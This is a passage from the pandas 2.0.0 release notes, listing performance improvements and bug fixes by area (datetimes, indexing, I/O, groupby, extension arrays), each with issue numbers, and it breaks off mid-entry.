(:issue:`48338`)\n- Performance improvement for :class:`Series` constructor passing integer numpy array with nullable dtype (:issue:`48338`)\n- Performance improvement for :class:`DatetimeIndex` constructor passing a list (:issue:`48609`)\n- Performance improvement in :func:`merge` and :meth:`DataFrame.join` when joining on a sorted :class:`MultiIndex` (:issue:`48504`)\n- Performance improvement in :func:`to_datetime` when parsing strings with timezone offsets (:issue:`50107`)\n- Performance improvement in :meth:`DataFrame.loc` and :meth:`Series.loc` for tuple-based indexing of a :class:`MultiIndex` (:issue:`48384`)\n- Performance improvement for :meth:`Series.replace` with categorical dtype (:issue:`49404`)\n- Performance improvement for :meth:`MultiIndex.unique` (:issue:`48335`)\n- Performance improvement for indexing operations with nullable and arrow dtypes (:issue:`49420`, :issue:`51316`)\n- Performance improvement for :func:`concat` with extension array backed indexes (:issue:`49128`, :issue:`49178`)\n- Performance improvement for :func:`api.types.infer_dtype` (:issue:`51054`)\n- Reduce memory usage of :meth:`DataFrame.to_pickle`/:meth:`Series.to_pickle` when using BZ2 or LZMA (:issue:`49068`)\n- Performance improvement for :class:`~arrays.StringArray` constructor passing a numpy array with type ``np.str_`` (:issue:`49109`)\n- Performance improvement in :meth:`~arrays.IntervalArray.from_tuples` (:issue:`50620`)\n- Performance improvement in :meth:`~arrays.ArrowExtensionArray.factorize` (:issue:`49177`)\n- Performance improvement in :meth:`~arrays.ArrowExtensionArray.__setitem__` (:issue:`50248`, :issue:`50632`)\n- Performance improvement in :class:`~arrays.ArrowExtensionArray` comparison methods when array contains NA (:issue:`50524`)\n- Performance improvement in :meth:`~arrays.ArrowExtensionArray.to_numpy` (:issue:`49973`, :issue:`51227`)\n- Performance improvement when parsing strings to :class:`BooleanDtype` (:issue:`50613`)\n- Performance improvement in :meth:`DataFrame.join` when joining on a subset of a :class:`MultiIndex` (:issue:`48611`)\n- Performance improvement for :meth:`MultiIndex.intersection` (:issue:`48604`)\n- Performance improvement in :meth:`DataFrame.__setitem__` (:issue:`46267`)\n- Performance improvement in ``var`` and ``std`` for nullable dtypes (:issue:`48379`).\n- Performance improvement when iterating over pyarrow and nullable dtypes (:issue:`49825`, :issue:`49851`)\n- Performance improvements to :func:`read_sas` (:issue:`47403`, :issue:`47405`, :issue:`47656`, :issue:`48502`)\n- Memory improvement in :meth:`RangeIndex.sort_values` (:issue:`48801`)\n- Performance improvement in :meth:`Series.to_numpy` if ``copy=True`` by avoiding copying twice (:issue:`24345`)\n- Performance improvement in :meth:`Series.rename` with :class:`MultiIndex` (:issue:`21055`)\n- Performance improvement in :class:`DataFrameGroupBy` and :class:`SeriesGroupBy` when ``by`` is a categorical type and ``sort=False`` (:issue:`48976`)\n- Performance improvement in :class:`DataFrameGroupBy` and :class:`SeriesGroupBy` when ``by`` is a categorical type and ``observed=False`` (:issue:`49596`)\n- Performance improvement in :func:`read_stata` with parameter ``index_col`` set to ``None`` (the default). Now the index will be a :class:`RangeIndex` instead of :class:`Int64Index` (:issue:`49745`)\n- Performance improvement in :func:`merge` when not merging on the index - the new index will now be :class:`RangeIndex` instead of :class:`Int64Index` (:issue:`49478`)\n- Performance improvement in :meth:`DataFrame.to_dict` and :meth:`Series.to_dict` when using any non-object dtypes (:issue:`46470`)\n- Performance improvement in :func:`read_html` when there are multiple tables (:issue:`49929`)\n- Performance improvement in :class:`Period` constructor when constructing from a string or integer (:issue:`38312`)\n- Performance improvement in :func:`to_datetime` when using ``'%Y%m%d'`` format (:issue:`17410`)\n- Performance improvement in :func:`to_datetime` when format is given or can be inferred (:issue:`50465`)\n- Performance improvement in :meth:`Series.median` for nullable dtypes (:issue:`50838`)\n- Performance improvement in :func:`read_csv` when passing :func:`to_datetime` lambda-function to ``date_parser`` and inputs have mixed timezone offsetes (:issue:`35296`)\n- Performance improvement in :func:`isna` and :func:`isnull` (:issue:`50658`)\n- Performance improvement in :meth:`.SeriesGroupBy.value_counts` with categorical dtype (:issue:`46202`)\n- Fixed a reference leak in :func:`read_hdf` (:issue:`37441`)\n- Fixed a memory leak in :meth:`DataFrame.to_json` and :meth:`Series.to_json` when serializing datetimes and timedeltas (:issue:`40443`)\n- Decreased memory usage in many :class:`DataFrameGroupBy` methods (:issue:`51090`)\n- Performance improvement in :meth:`DataFrame.round` for an integer ``decimal`` parameter (:issue:`17254`)\n- Performance improvement in :meth:`DataFrame.replace` and :meth:`Series.replace` when using a large dict for ``to_replace`` (:issue:`6697`)\n- Memory improvement in :class:`StataReader` when reading seekable files (:issue:`48922`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_200.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\nCategorical\n^^^^^^^^^^^\n- Bug in :meth:`Categorical.set_categories` losing dtype information (:issue:`48812`)\n- Bug in :meth:`Series.replace` with categorical dtype when ``to_replace`` values overlap with new values (:issue:`49404`)\n- Bug in :meth:`Series.replace` with categorical dtype losing nullable dtypes of underlying categories (:issue:`49404`)\n- Bug in :meth:`DataFrame.groupby` and :meth:`Series.groupby` would reorder categories when used as a grouper (:issue:`48749`)\n- Bug in :class:`Categorical` constructor when constructing from a :class:`Categorical` object and ``dtype=\"category\"`` losing ordered-ness (:issue:`49309`)\n- Bug in :meth:`.SeriesGroupBy.min`, :meth:`.SeriesGroupBy.max`, :meth:`.DataFrameGroupBy.min`, and :meth:`.DataFrameGroupBy.max` with unordered :class:`CategoricalDtype` with no groups failing to raise ``TypeError`` (:issue:`51034`)\n\nDatetimelike\n^^^^^^^^^^^^\n- Bug in :func:`pandas.infer_freq`, raising ``TypeError`` when inferred on :class:`RangeIndex` (:issue:`47084`)\n- Bug in :func:`to_datetime` incorrectly raising ``OverflowError`` with string arguments corresponding to large integers (:issue:`50533`)\n- Bug in :func:`to_datetime` was raising on invalid offsets with ``errors='coerce'`` and ``infer_datetime_format=True`` (:issue:`48633`)\n- Bug in :class:`DatetimeIndex` constructor failing to raise when ``tz=None`` is explicitly specified in conjunction with timezone-aware ``dtype`` or data (:issue:`48659`)\n- Bug in subtracting a ``datetime`` scalar from :class:`DatetimeIndex` failing to retain the original ``freq`` attribute (:issue:`48818`)\n- Bug in ``pandas.tseries.holiday.Holiday`` where a half-open date interval causes inconsistent return types from :meth:`USFederalHolidayCalendar.holidays` (:issue:`49075`)\n- Bug in rendering :class:`DatetimeIndex` and :class:`Series` and :class:`DataFrame` with timezone-aware dtypes with ``dateutil`` or ``zoneinfo`` timezones near daylight-savings transitions (:issue:`49684`)\n- Bug in :func:`to_datetime` was raising ``ValueError`` when parsing :class:`Timestamp`, ``datetime.datetime``, ``datetime.date``, or ``np.datetime64`` objects when non-ISO8601 ``format`` was passed (:issue:`49298`, :issue:`50036`)\n- Bug in :func:`to_datetime` was raising ``ValueError`` when parsing empty string and non-ISO8601 format was passed. Now, empty strings will be parsed as :class:`NaT`, for compatibility with how is done for ISO8601 formats (:issue:`50251`)\n- Bug in :class:`Timestamp` was showing ``UserWarning``, which was not actionable by users, when parsing non-ISO8601 delimited date strings (:issue:`50232`)\n- Bug in :func:`to_datetime` was showing misleading ``ValueError`` when parsing dates with format containing ISO week directive and ISO weekday directive (:issue:`50308`)\n- Bug in :meth:`Timestamp.round` when the ``freq`` argument has zero-duration (e.g. \"0ns\") returning incorrect results instead of raising (:issue:`49737`)\n- Bug in :func:`to_datetime` was not raising ``ValueError`` when invalid format was passed and ``errors`` was ``'ignore'`` or ``'coerce'`` (:issue:`50266`)\n- Bug in :class:`DateOffset` was throwing ``TypeError`` when constructing with milliseconds and another super-daily argument (:issue:`49897`)\n- Bug in :func:`to_datetime` was not raising ``ValueError`` when parsing string with decimal date with format ``'%Y%m%d'`` (:issue:`50051`)\n- Bug in :func:`to_datetime` was not converting ``None`` to ``NaT`` when parsing mixed-offset date strings with ISO8601 format (:issue:`50071`)\n- Bug in :func:`to_datetime` was not returning input when parsing out-of-bounds date string with ``errors='ignore'`` and ``format='%Y%m%d'`` (:issue:`14487`)\n- Bug in :func:`to_datetime` was converting timezone-naive ``datetime.datetime`` to timezone-aware when parsing with timezone-aware strings, ISO8601 format, and ``utc=False`` (:issue:`50254`)\n- Bug in :func:`to_datetime` was throwing ``ValueError`` when parsing dates with ISO8601 format where some values were not zero-padded (:issue:`21422`)\n- Bug in :func:`to_datetime` was giving incorrect results when using ``format='%Y%m%d'`` and ``errors='ignore'`` (:issue:`26493`)\n- Bug in :func:`to_datetime` was failing to parse date strings ``'today'`` and ``'now'`` if ``format`` was not ISO8601 (:issue:`50359`)\n- Bug in :func:`Timestamp.utctimetuple` raising a ``TypeError`` (:issue:`32174`)\n- Bug in :func:`to_datetime` was raising ``ValueError`` when parsing mixed-offset :class:`Timestamp` with ``errors='ignore'`` (:issue:`50585`)\n- Bug in :func:`to_datetime` was incorrectly handling floating-point inputs within 1 ``unit`` of the overflow boundaries (:issue:`50183`)\n- Bug in :func:`to_datetime` with unit of \"Y\" or \"M\" giving incorrect results, not matching pointwise :class:`Timestamp` results (:issue:`50870`)\n- Bug in :meth:`Series.interpolate` and :meth:`DataFrame.interpolate` with datetime or timedelta dtypes incorrectly raising ``ValueError`` (:issue:`11312`)\n- Bug in :func:`to_datetime` was not returning input with ``errors='ignore'`` when input was out-of-bounds (:issue:`50587`)\n- Bug in :func:`DataFrame.from_records` when given a :class:`DataFrame` input with timezone-aware datetime64 columns incorrectly dropping the timezone-awareness (:issue:`51162`)\n- Bug in :func:`to_datetime` was raising ``decimal.InvalidOperation`` when parsing date strings with ``errors='coerce'`` (:issue:`51084`)\n- Bug in :func:`to_datetime` with both ``unit`` and ``origin`` specified returning incorrect results (:issue:`42624`)\n- Bug in :meth:`Series.astype` and :meth:`DataFrame.astype` when converting an object-dtype object containing timezone-aware datetimes or strings to ``datetime64[ns]`` incorrectly localizing as UTC instead of raising ``TypeError`` (:issue:`50140`)\n- Bug in :meth:`.DataFrameGroupBy.quantile` and :meth:`.SeriesGroupBy.quantile` with datetime or timedelta dtypes giving incorrect results for groups containing ``NaT`` (:issue:`51373`)\n- Bug in :meth:`.DataFrameGroupBy.quantile` and :meth:`.SeriesGroupBy.quantile` incorrectly raising with :class:`PeriodDtype` or :class:`DatetimeTZDtype` (:issue:`51373`)\n\nTimedelta\n^^^^^^^^^\n- Bug in :func:`to_timedelta` raising error when input has nullable dtype ``Float64`` (:issue:`48796`)\n- Bug in :class:`Timedelta` constructor incorrectly raising instead of returning ``NaT`` when given a ``np.timedelta64(\"nat\")`` (:issue:`48898`)\n- Bug in :class:`Timedelta` constructor failing to raise when passed both a :class:`Timedelta` object and keywords (e.g. days, seconds) (:issue:`48898`)\n- Bug in :class:`Timedelta` comparisons with very large ``datetime.timedelta`` objects incorrect raising ``OutOfBoundsTimedelta`` (:issue:`49021`)\n\nTimezones\n^^^^^^^^^\n- Bug in :meth:`Series.astype` and :meth:`DataFrame.astype` with object-dtype containing multiple timezone-aware ``datetime`` objects with heterogeneous timezones to a :class:`DatetimeTZDtype` incorrectly raising (:issue:`32581`)\n- Bug in :func:`to_datetime` was failing to parse date strings with timezone name when ``format`` was specified with ``%Z`` (:issue:`49748`)\n- Better error message when passing invalid values to ``ambiguous`` parameter in :meth:`Timestamp.tz_localize` (:issue:`49565`)\n- Bug in string parsing incorrectly allowing a :class:`Timestamp` to be constructed with an invalid timezone, which would raise when trying to print (:issue:`50668`)\n- Corrected TypeError message in :func:`objects_to_datetime64ns` to inform that DatetimeIndex has mixed timezones (:issue:`50974`)\n\nNumeric\n^^^^^^^\n- Bug in :meth:`DataFrame.add` cannot apply ufunc when inputs contain mixed DataFrame type and Series type (:issue:`39853`)\n- Bug in arithmetic operations on :class:`Series` not propagating mask when combining masked dtypes and numpy dtypes (:issue:`45810`, :issue:`42630`)\n- Bug in :meth:`DataFrame.sem` and :meth:`Series.sem` where an erroneous ``TypeError`` would always raise when using data backed by an :class:`ArrowDtype` (:issue:`49759`)\n- Bug in :meth:`Series.__add__` casting to object for list and masked :class:`Series` (:issue:`22962`)\n- Bug in :meth:`~arrays.ArrowExtensionArray.mode` where ``dropna=False`` was not respected when there was ``NA`` values (:issue:`50982`)\n- Bug in :meth:`DataFrame.query` with ``engine=\"numexpr\"`` and column names are ``min`` or ``max`` would raise a ``TypeError`` (:issue:`50937`)\n- Bug in :meth:`DataFrame.min` and :meth:`DataFrame.max` with tz-aware data containing ``pd.NaT`` and ``axis=1`` would return incorrect results (:issue:`51242`)\n\nConversion\n^^^^^^^^^^\n- Bug in constructing :class:`Series` with ``int64`` dtype from a string list raising instead of casting (:issue:`44923`)\n- Bug in constructing :class:`Series` with masked dtype and boolean values with ``NA`` raising (:issue:`42137`)\n- Bug in :meth:`DataFrame.eval` incorrectly raising an ``AttributeError`` when there are negative values in function call (:issue:`46471`)\n- Bug in :meth:`Series.convert_dtypes` not converting dtype to nullable dtype when :class:`Series` contains ``NA`` and has dtype ``object`` (:issue:`48791`)\n- Bug where any :class:`ExtensionDtype` subclass with ``kind=\"M\"`` would be interpreted as a timezone type (:issue:`34986`)\n- Bug in :class:`.arrays.ArrowExtensionArray` that would raise ``NotImplementedError`` when passed a sequence of strings or binary (:issue:`49172`)\n- Bug in :meth:`Series.astype` raising ``pyarrow.ArrowInvalid`` when converting from a non-pyarrow string dtype to a pyarrow numeric type (:issue:`50430`)\n- Bug in :meth:`DataFrame.astype` modifying input array inplace when converting to ``string`` and ``copy=False`` (:issue:`51073`)\n- Bug in :meth:`Series.to_numpy` converting to NumPy array before applying ``na_value`` (:issue:`48951`)\n- Bug in :meth:`DataFrame.astype` not copying data when converting to pyarrow dtype (:issue:`50984`)\n- Bug in :func:`to_datetime` was not respecting ``exact`` argument when ``format`` was an ISO8601 format (:issue:`12649`)\n- Bug in :meth:`TimedeltaArray.astype` raising ``TypeError`` when converting to a pyarrow duration type (:issue:`49795`)\n- Bug in :meth:`DataFrame.eval` and :meth:`DataFrame.query` raising for extension array dtypes (:issue:`29618`, :issue:`50261`, :issue:`31913`)\n- Bug in :meth:`Series` not copying data when created from :class:`Index` and ``dtype`` is equal to ``dtype`` from :class:`Index` (:issue:`52008`)\n\nStrings\n^^^^^^^\n- Bug in :func:`pandas.api.types.is_string_dtype` that would not return ``True`` for :class:`StringDtype` or :class:`ArrowDtype` with ``pyarrow.string()`` (:issue:`15585`)\n- Bug in converting string dtypes to \"datetime64[ns]\" or \"timedelta64[ns]\" incorrectly raising ``TypeError`` (:issue:`36153`)\n- Bug in setting values in a string-dtype column with an array, mutating the array as side effect when it contains missing values (:issue:`51299`)\n\nInterval\n^^^^^^^^\n- Bug in :meth:`IntervalIndex.is_overlapping` incorrect output if interval has duplicate left boundaries (:issue:`49581`)\n- Bug in :meth:`Series.infer_objects` failing to infer :class:`IntervalDtype` for an object series of :class:`Interval` objects (:issue:`50090`)\n- Bug in :meth:`Series.shift` with :class:`IntervalDtype` and invalid null ``fill_value`` failing to raise ``TypeError`` (:issue:`51258`)\n\nIndexing\n^^^^^^^^\n- Bug in :meth:`DataFrame.__setitem__` raising when indexer is a :class:`DataFrame` with ``boolean`` dtype (:issue:`47125`)\n- Bug in :meth:`DataFrame.reindex` filling with wrong values when indexing columns and index for ``uint`` dtypes (:issue:`48184`)\n- Bug in :meth:`DataFrame.loc` when setting :class:`DataFrame` with different dtypes coercing values to single dtype (:issue:`50467`)\n- Bug in :meth:`DataFrame.sort_values` where ``None`` was not returned when ``by`` is empty list and ``inplace=True`` (:issue:`50643`)\n- Bug in :meth:`DataFrame.loc` coercing dtypes when setting values with a list indexer (:issue:`49159`)\n- Bug in :meth:`Series.loc` raising error for out of bounds end of slice indexer (:issue:`50161`)\n- Bug in :meth:`DataFrame.loc` raising ``ValueError`` with all ``False`` ``bool`` indexer and empty object (:issue:`51450`)\n- Bug in :meth:`DataFrame.loc` raising ``ValueError`` with ``bool`` indexer and :class:`MultiIndex` (:issue:`47687`)\n- Bug in :meth:`DataFrame.loc` raising ``IndexError`` when setting values for a pyarrow-backed column with a non-scalar indexer (:issue:`50085`)\n- Bug in :meth:`DataFrame.__getitem__`, :meth:`Series.__getitem__`, :meth:`DataFrame.__setitem__` and :meth:`Series.__setitem__`\n  when indexing on indexes with extension float dtypes (:class:`Float64` & :class:`Float64`) or complex dtypes using integers (:issue:`51053`)\n- Bug in :meth:`DataFrame.loc` modifying object when setting incompatible value with an empty indexer (:issue:`45981`)\n- Bug in :meth:`DataFrame.__setitem__` raising ``ValueError`` when right hand side is :class:`DataFrame` with :class:`MultiIndex` columns (:issue:`49121`)\n- Bug in :meth:`DataFrame.reindex` casting dtype to ``object`` when :class:`DataFrame` has single extension array column when re-indexing ``columns`` and ``index`` (:issue:`48190`)\n- Bug in :meth:`DataFrame.iloc` raising ``IndexError`` when indexer is a :class:`Series` with numeric extension array dtype (:issue:`49521`)\n- Bug in :func:`~DataFrame.describe` when formatting percentiles in the resulting index showed more decimals than needed (:issue:`46362`)\n- Bug in :meth:`DataFrame.compare` does not recognize differences when comparing ``NA`` with value in nullable dtypes (:issue:`48939`)\n- Bug in :meth:`Series.rename` with :class:`MultiIndex` losing extension array dtypes (:issue:`21055`)\n- Bug in :meth:`DataFrame.isetitem` coercing extension array dtypes in :class:`DataFrame` to object (:issue:`49922`)\n- Bug in :meth:`Series.__getitem__` returning corrupt object when selecting from an empty pyarrow backed object (:issue:`51734`)\n- Bug in :class:`BusinessHour` would cause creation of :class:`DatetimeIndex` to fail when no opening hour was included in the index (:issue:`49835`)\n\nMissing\n^^^^^^^\n- Bug in :meth:`Index.equals` raising ``TypeError`` when :class:`Index` consists of tuples that contain ``NA`` (:issue:`48446`)\n- Bug in :meth:`Series.map` caused incorrect result when data has NaNs and defaultdict mapping was used (:issue:`48813`)\n- Bug in :class:`NA` raising a ``TypeError`` instead of return :class:`NA` when performing a binary operation with a ``bytes`` object (:issue:`49108`)\n- Bug in :meth:`DataFrame.update` with ``overwrite=False`` raising ``TypeError`` when ``self`` has column with ``NaT`` values and column not present in ``other`` (:issue:`16713`)\n- Bug in :meth:`Series.replace` raising ``RecursionError`` when replacing value in object-dtype :class:`Series` containing ``NA`` (:issue:`47480`)\n- Bug in :meth:`Series.replace` raising ``RecursionError`` when replacing value in numeric :class:`Series` with ``NA`` (:issue:`50758`)\n\nMultiIndex\n^^^^^^^^^^\n- Bug in :meth:`MultiIndex.get_indexer` not matching ``NaN`` values (:issue:`29252`, :issue:`37222`, :issue:`38623`, :issue:`42883`, :issue:`43222`, :issue:`46173`, :issue:`48905`)\n- Bug in :meth:`MultiIndex.argsort` raising ``TypeError`` when index contains :attr:`NA` (:issue:`48495`)\n- Bug in :meth:`MultiIndex.difference` losing extension array dtype (:issue:`48606`)\n- Bug in :class:`MultiIndex.set_levels` raising ``IndexError`` when setting empty level (:issue:`48636`)\n- Bug in :meth:`MultiIndex.unique` losing extension array dtype (:issue:`48335`)\n- Bug in :meth:`MultiIndex.intersection` losing extension array (:issue:`48604`)\n- Bug in :meth:`MultiIndex.union` losing extension array (:issue:`48498`, :issue:`48505`, :issue:`48900`)\n- Bug in :meth:`MultiIndex.union` not sorting when sort=None and index contains missing values (:issue:`49010`)\n- Bug in :meth:`MultiIndex.append` not checking names for equality (:issue:`48288`)\n- Bug in :meth:`MultiIndex.symmetric_difference` losing extension array (:issue:`48607`)\n- Bug in :meth:`MultiIndex.join` losing dtypes when :class:`MultiIndex` has duplicates (:issue:`49830`)\n- Bug in :meth:`MultiIndex.putmask` losing extension array (:issue:`49830`)\n- Bug in :meth:`MultiIndex.value_counts` returning a :class:`Series` indexed by flat index of tuples instead of a :class:`MultiIndex` (:issue:`49558`)\n\nI/O\n^^^\n- Bug in :func:`read_sas` caused fragmentation of :class:`DataFrame` and raised :class:`.errors.PerformanceWarning` (:issue:`48595`)\n- Improved error message in :func:`read_excel` by including the offending sheet name when an exception is raised while reading a file (:issue:`48706`)\n- Bug when a pickling a subset PyArrow-backed data that would serialize the entire data instead of the subset (:issue:`42600`)\n- Bug in :func:`read_sql_query` ignoring ``dtype`` argument when ``chunksize`` is specified and result is empty (:issue:`50245`)\n- Bug in :func:`read_csv` for a single-line csv with fewer columns than ``names`` raised :class:`.errors.ParserError` with ``engine=\"c\"`` (:issue:`47566`)\n- Bug in :func:`read_json` raising with ``orient=\"table\"`` and ``NA`` value (:issue:`40255`)\n- Bug in displaying ``string`` dtypes not showing storage option (:issue:`50099`)\n- Bug in :meth:`DataFrame.to_string` with ``header=False`` that printed the index name on the same line as the first row of the data (:issue:`49230`)\n- Bug in :meth:`DataFrame.to_string` ignoring float formatter for extension arrays (:issue:`39336`)\n- Fixed memory leak which stemmed from the initialization of the internal JSON module (:issue:`49222`)\n- Fixed issue where :func:`json_normalize` would incorrectly remove leading characters from column names that matched the ``sep`` argument (:issue:`49861`)\n- Bug in :func:`read_csv` unnecessarily overflowing for extension array dtype when containing ``NA`` (:issue:`32134`)\n- Bug in :meth:`DataFrame.to_dict` not converting ``NA`` to ``None`` (:issue:`50795`)\n- Bug in :meth:`DataFrame.to_json` where it would segfault when failing to encode a string (:issue:`50307`)\n- Bug in :meth:`DataFrame.to_html` with ``na_rep`` set when the :class:`DataFrame` contains non-scalar data (:issue:`47103`)\n- Bug in :func:`read_xml` where file-like objects failed when iterparse is used (:issue:`50641`)\n- Bug in :func:`read_csv` when ``engine=\"pyarrow\"`` where ``encoding`` parameter was not handled correctly (:issue:`51302`)\n- Bug in :func:`read_xml` ignored repeated elements when iterparse is used (:issue:`51183`)\n- Bug in :class:`ExcelWriter` leaving file handles open if an exception occurred during instantiation (:issue:`51443`)\n- Bug in :meth:`DataFrame.to_parquet` where non-string index or columns were raising a ``ValueError`` when ``engine=\"pyarrow\"`` (:issue:`52036`)\n\nPeriod\n^^^^^^\n- Bug in :meth:`Period.strftime` and :meth:`PeriodIndex.strftime`, raising ``UnicodeDecodeError`` when a locale-specific directive was passed (:issue:`46319`)\n- Bug in adding a :class:`Period` object to an array of :class:`DateOffset` objects incorrectly raising ``TypeError`` (:issue:`50162`)\n- Bug in :class:`Period` where passing a string with finer resolution than nanosecond would result in a ``KeyError`` instead of dropping the extra precision (:issue:`50417`)\n- Bug in parsing strings representing Week-periods e.g. \"2017-01-23/2017-01-29\" as minute-frequency instead of week-frequency (:issue:`50803`)\n- Bug in :meth:`.DataFrameGroupBy.sum`, :meth:`.DataFrameGroupByGroupBy.cumsum`, :meth:`.DataFrameGroupByGroupBy.prod`, :meth:`.DataFrameGroupByGroupBy.cumprod` with :class:`PeriodDtype` failing to raise ``TypeError`` (:issue:`51040`)\n- Bug in parsing empty string with :class:`Period` incorrectly raising ``ValueError`` instead of returning ``NaT`` (:issue:`51349`)\n\nPlotting\n^^^^^^^^\n- Bug in :meth:`DataFrame.plot.hist`, not dropping elements of ``weights`` corresponding to ``NaN`` values in ``data`` (:issue:`48884`)\n- ``ax.set_xlim`` was sometimes raising ``UserWarning`` which users couldn't address due to ``set_xlim`` not accepting parsing arguments - the converter now uses :func:`Timestamp` instead (:issue:`49148`)\n\nGroupby/resample/rolling\n^^^^^^^^^^^^^^^^^^^^^^^^\n- Bug in :class:`.ExponentialMovingWindow` with ``online`` not raising a ``NotImplementedError`` for unsupported operations (:issue:`48834`)\n- Bug in :meth:`.DataFrameGroupBy.sample` raises ``ValueError`` when the object is empty (:issue:`48459`)\n- Bug in :meth:`Series.groupby` raises ``ValueError`` when an entry of the index is equal to the name of the index (:issue:`48567`)\n- Bug in :meth:`.DataFrameGroupBy.resample` produces inconsistent results when passing empty DataFrame (:issue:`47705`)\n- Bug in :class:`.DataFrameGroupBy` and :class:`.SeriesGroupBy` would not include unobserved categories in result when grouping by categorical indexes (:issue:`49354`)\n- Bug in :class:`.DataFrameGroupBy` and :class:`.SeriesGroupBy` would change result order depending on the input index when grouping by categoricals (:issue:`49223`)\n- Bug in :class:`.DataFrameGroupBy` and :class:`.SeriesGroupBy` when grouping on categorical data would sort result values even when used with ``sort=False`` (:issue:`42482`)\n- Bug in :meth:`.DataFrameGroupBy.apply` and :class:`.SeriesGroupBy.apply` with ``as_index=False`` would not attempt the computation without using the grouping keys when using them failed with a ``TypeError`` (:issue:`49256`)\n- Bug in :meth:`.DataFrameGroupBy.describe` would describe the group keys (:issue:`49256`)\n- Bug in :meth:`.SeriesGroupBy.describe` with ``as_index=False`` would have the incorrect shape (:issue:`49256`)\n- Bug in :class:`.DataFrameGroupBy` and :class:`.SeriesGroupBy` with ``dropna=False`` would drop NA values when the grouper was categorical (:issue:`36327`)\n- Bug in :meth:`.SeriesGroupBy.nunique` would incorrectly raise when the grouper was an empty categorical and ``observed=True`` (:issue:`21334`)\n- Bug in :meth:`.SeriesGroupBy.nth` would raise when grouper contained NA values after subsetting from a :class:`DataFrameGroupBy` (:issue:`26454`)\n- Bug in :meth:`DataFrame.groupby` would not include a :class:`.Grouper` specified by ``key`` in the result when ``as_index=False`` (:issue:`50413`)\n- Bug in :meth:`.DataFrameGroupBy.value_counts` would raise when used with a :class:`.TimeGrouper` (:issue:`50486`)\n- Bug in :meth:`.Resampler.size` caused a wide :class:`DataFrame` to be returned instead of a :class:`Series` with :class:`MultiIndex` (:issue:`46826`)\n- Bug in :meth:`.DataFrameGroupBy.transform` and :meth:`.SeriesGroupBy.transform` would raise incorrectly when grouper had ``axis=1`` for ``\"idxmin\"`` and ``\"idxmax\"`` arguments (:issue:`45986`)\n- Bug in :class:`.DataFrameGroupBy` would raise when used with an empty DataFrame, categorical grouper, and ``dropna=False`` (:issue:`50634`)\n- Bug in :meth:`.SeriesGroupBy.value_counts` did not respect ``sort=False`` (:issue:`50482`)\n- Bug in :meth:`.DataFrameGroupBy.resample` raises ``KeyError`` when getting the result from a key list when resampling on time index (:issue:`50840`)\n- Bug in :meth:`.DataFrameGroupBy.transform` and :meth:`.SeriesGroupBy.transform` would raise incorrectly when grouper had ``axis=1`` for ``\"ngroup\"`` argument (:issue:`45986`)\n- Bug in :meth:`.DataFrameGroupBy.describe` produced incorrect results when data had duplicate columns (:issue:`50806`)\n- Bug in :meth:`.DataFrameGroupBy.agg` with ``engine=\"numba\"`` failing to respect ``as_index=False`` (:issue:`51228`)\n- Bug in :meth:`.DataFrameGroupBy.agg`, :meth:`.SeriesGroupBy.agg`, and :meth:`.Resampler.agg` would ignore arguments when passed a list of functions (:issue:`50863`)\n- Bug in :meth:`.DataFrameGroupBy.ohlc` ignoring ``as_index=False`` (:issue:`51413`)\n- Bug in :meth:`DataFrameGroupBy.agg` after subsetting columns (e.g. ``.groupby(...)[[\"a\", \"b\"]]``) would not include groupings in the result (:issue:`51186`)\n\nReshaping\n^^^^^^^^^\n- Bug in :meth:`DataFrame.pivot_table` raising ``TypeError`` for nullable dtype and ``margins=True`` (:issue:`48681`)\n- Bug in :meth:`DataFrame.unstack` and :meth:`Series.unstack` unstacking wrong level of :class:`MultiIndex` when :class:`MultiIndex` has mixed names (:issue:`48763`)\n- Bug in :meth:`DataFrame.melt` losing extension array dtype (:issue:`41570`)\n- Bug in :meth:`DataFrame.pivot` not respecting ``None`` as column name (:issue:`48293`)\n- Bug in :meth:`DataFrame.join` when ``left_on`` or ``right_on`` is or includes a :class:`CategoricalIndex` incorrectly raising ``AttributeError`` (:issue:`48464`)\n- Bug in :meth:`DataFrame.pivot_table` raising ``ValueError`` with parameter ``margins=True`` when result is an empty :class:`DataFrame` (:issue:`49240`)\n- Clarified error message in :func:`merge` when passing invalid ``validate`` option (:issue:`49417`)\n- Bug in :meth:`DataFrame.explode` raising ``ValueError`` on multiple columns with ``NaN`` values or empty lists (:issue:`46084`)\n- Bug in :meth:`DataFrame.transpose` with ``IntervalDtype`` column with ``timedelta64[ns]`` endpoints (:issue:`44917`)\n- Bug in :meth:`DataFrame.agg` and :meth:`Series.agg` would ignore arguments when passed a list of functions (:issue:`50863`)\n\nSparse\n^^^^^^\n- Bug in :meth:`Series.astype` when converting a ``SparseDtype`` with ``datetime64[ns]`` subtype to ``int64`` dtype raising, inconsistent with the non-sparse behavior (:issue:`49631`,:issue:`50087`)\n- Bug in :meth:`Series.astype` when converting a from ``datetime64[ns]`` to ``Sparse[datetime64[ns]]`` incorrectly raising (:issue:`50082`)\n- Bug in :meth:`Series.sparse.to_coo` raising ``SystemError`` when :class:`MultiIndex` contains a ``ExtensionArray`` (:issue:`50996`)\n\nExtensionArray\n^^^^^^^^^^^^^^\n- Bug in :meth:`Series.mean` overflowing unnecessarily with nullable integers (:issue:`48378`)\n- Bug in :meth:`Series.tolist` for nullable dtypes returning numpy scalars instead of python scalars (:issue:`49890`)\n- Bug in :meth:`Series.round` for pyarrow-backed dtypes raising ``AttributeError`` (:issue:`50437`)\n- Bug when concatenating an empty DataFrame with an ExtensionDtype to another DataFrame with the same ExtensionDtype, the resulting dtype turned into object (:issue:`48510`)\n- Bug in :meth:`array.PandasArray.to_numpy` raising with ``NA`` value when ``na_value`` is specified (:issue:`40638`)\n- Bug in :meth:`api.types.is_numeric_dtype` where a custom :class:`ExtensionDtype` would not return ``True`` if ``_is_numeric`` returned ``True`` (:issue:`50563`)\n- Bug in :meth:`api.types.is_integer_dtype`, :meth:`api.types.is_unsigned_integer_dtype`, :meth:`api.types.is_signed_integer_dtype`, :meth:`api.types.is_float_dtype` where a custom :class:`ExtensionDtype` would not return ``True`` if ``kind`` returned the corresponding NumPy type (:issue:`50667`)\n- Bug in :class:`Series` constructor unnecessarily overflowing for nullable unsigned integer dtypes (:issue:`38798`, :issue:`25880`)\n- Bug in setting non-string value into ``StringArray`` raising ``ValueError`` instead of ``TypeError`` (:issue:`49632`)\n- Bug in :meth:`DataFrame.reindex` not honoring the default ``copy=True`` keyword in case of columns with ExtensionDtype (and as a result also selecting multiple columns with getitem (``[]``) didn't correctly result in a copy) (:issue:`51197`)\n- Bug in :class:`~arrays.ArrowExtensionArray` logical operations 